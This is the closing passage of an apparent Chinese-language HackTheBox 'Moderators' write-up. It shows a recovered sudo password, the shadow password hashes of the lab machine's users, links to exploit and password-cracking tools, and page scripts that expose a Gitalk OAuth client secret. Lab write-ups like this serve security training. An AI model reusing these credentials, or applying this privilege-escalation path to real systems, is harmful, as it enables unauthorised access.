<span class="attr">timestamp</span>=<span class="string">"1657117380950198402"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/HostInfo/DekMissing"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">timestamp</span>=<span class="string">"1660245560293252500"</span> <span class="attr">flags</span>=<span class="string">"RDONLYGUEST"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/HostInfo/GUI/LanguageID"</span> <span class="attr">value</span>=<span class="string">"es_ES"</span> <span class="attr">timestamp</span>=<span class="string">"1660245647071532000"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">GuestProperties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Hardware</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">StorageControllers</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">StorageController</span> <span class="attr">name</span>=<span class="string">"AHCI"</span> <span class="attr">type</span>=<span class="string">"AHCI"</span> <span class="attr">PortCount</span>=<span class="string">"3"</span> <span class="attr">useHostIOCache</span>=<span class="string">"false"</span> <span class="attr">Bootable</span>=<span class="string">"true"</span> <span class="attr">IDE0MasterEmulationPort</span>=<span class="string">"0"</span> <span class="attr">IDE0SlaveEmulationPort</span>=<span class="string">"1"</span> <span class="attr">IDE1MasterEmulationPort</span>=<span class="string">"2"</span> <span class="attr">IDE1SlaveEmulationPort</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">AttachedDevice</span> <span class="attr">type</span>=<span class="string">"HardDisk"</span> <span class="attr">hotpluggable</span>=<span class="string">"false"</span> <span class="attr">port</span>=<span class="string">"0"</span> <span class="attr">device</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Image</span> <span class="attr">uuid</span>=<span class="string">"&#123;12b147da-5b2d-471f-9e32-a32b1517ff4b&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">AttachedDevice</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">StorageController</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">StorageControllers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">VideoCapture</span> <span class="attr">options</span>=<span class="string">"vc_enabled=true,ac_enabled=true,ac_profile=med"</span> <span class="attr">fps</span>=<span class="string">"25"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Machine</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualBox</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>前面得到的密码就是john密码，在 sudoers 级别具有 ALL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_THE_best_Sysadmin_Ever_</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092917.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$aqIOGu.rJRXjVGgt$lN7qDpHZdrBxEcRi4VxcJt4dpNXwmxLsO7mTliULzPVcJyy5OPxLP3SmvgcprzkeZLbX.lPrqEg3JYYyV3Ayo0:19021:0:99999:7:::</span><br><span class="line">john:$6$PK0A253j816qSMhV$4Oy&#x2F;1b8vR6K1XDcvBMzAVZn.MOVLiBWDHOugQorKdhVBnbi1o.fSKcSzrltl9z7hiGekw6bkt18XH14e0ALTC0:18890:0:99999:7:::</span><br><span class="line">lexi:$6$IXHONvrvfEmCO7dH$banmCiCTcf7rcYWQr7jn3GkYeRpfQYWxafrlhhpcpdOfqkMwBEpFXVinENnfhEa3EdiE92v30PBhp6GqF6w67&#x2F;:18890:0:99999:7:::</span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>WordPress Plugin Brandfolder 3.0 - Local/Remote File Inclusion - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/39591" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39591</a></li>
<li>Generador de hash de contraseña de WordPress<br><a href="https://www.useotools.com/es/wordpress-password-hash-generator/" target="_blank" rel="noopener">https://www.useotools.com/es/wordpress-password-hash-generator/</a></li>
<li>axcheron/pyvboxdie-cracker: Simple Python tool to crack VirtualBox Disk Image Encryption passwords<br><a href="https://github.com/axcheron/pyvboxdie-cracker" target="_blank" rel="noopener">https://github.com/axcheron/pyvboxdie-cracker</a></li>
<li>Diverto/cryptsetup-pwguess: Modified cryptsetup to enable password guessing - <a href="https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases" target="_blank" rel="noopener">https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases</a><br><a href="https://github.com/Diverto/cryptsetup-pwguess" target="_blank" rel="noopener">https://github.com/Diverto/cryptsetup-pwguess</a></li>
<li>Moderators-HTB [Discussion] | BreachForums<br><a href="https://breached.to/Thread-Moderators-HTB-Discussion" target="_blank" rel="noopener">https://breached.to/Thread-Moderators-HTB-Discussion</a></li>
<li>Writeup Moderators HackTheBox<br><a href="https://gatogamer1155.github.io/hackthebox/moderators/" target="_blank" rel="noopener">https://gatogamer1155.github.io/hackthebox/moderators/</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2022-11-07T01:01:03.748Z" itemprop="dateUpdated">2022-11-07 09:01:03</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/&title=《Moderators - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/&title=《Moderators - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Moderators - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/10/07/OSED%E5%8F%97%E9%A8%93%E8%A8%98/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">OSED受験記</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/09/27/Absolute-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Absolute - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2022</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/&title=《Moderators - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/&title=《Moderators - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Moderators - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2022/09/29/Moderators-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKUlEQVR42u3awY7CMAxFUf7/p8t2EGp6nx1GSnKzQlBoThfGsf164XXdrL+f3l3/fc349fevTVsyZMhYlnENF7lmfGMOTu8rQ4aM0xj89iSYjrdOYibfmwwZMmTwrcy6XoYMGTJmMcYJHDmUkutlyJAhIz3EchIJsmmiOe0sLkOGjAUZ/Hj5/69/0t+QIUPGUowrXIRXa0mmTYiPX5YhQ8bWjLQ0dretWrGMpIm8hSBDhowTGJ2WZFo4S8fCyDsyZMjYlZGmcelQF6fWmgQfGa4MGTK2ZvDhUfJ+DcnTUBkyZJzGSI+O/GiaPoL0oBt8QYYMGYszOkGzVvTvsGXIkHEmoxahOyNcfLtp2U6GDBm7MjqhsDY6RvBpmU+GDBl7M9AZF690zKLfhAjyUBkyZCzLqA1g1QJobUSj9b8hQ4aMYxgksJLbd5oEwcyIDBkyNmXwJGxWS2DykiFDxgEMcstaKa2WXPK2hAwZMk5g8EPpQzm+Aej8JciQIeNMBimW1YbD0gcUB2UZMmQcwKiFUfLdNODWSDJkyDiBMavQRj7tjOw/zOHKkCFjO8YVLr6hNCjztsRDUihDhoztGLWyVxoua6lhp/AnQ4aM/Rhkc2ngq42OtdJQGTJkHMBIAyVhk7QyTfVueTJkyJABSv9807whEeSwMmTIkBEyeJGOB/cHpAwZMg5g8FQvvQEf/+qMcciQIWNvRpp38RvUNjF+WK1GpgwZMtZjvAGm6Z07zQE7BAAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
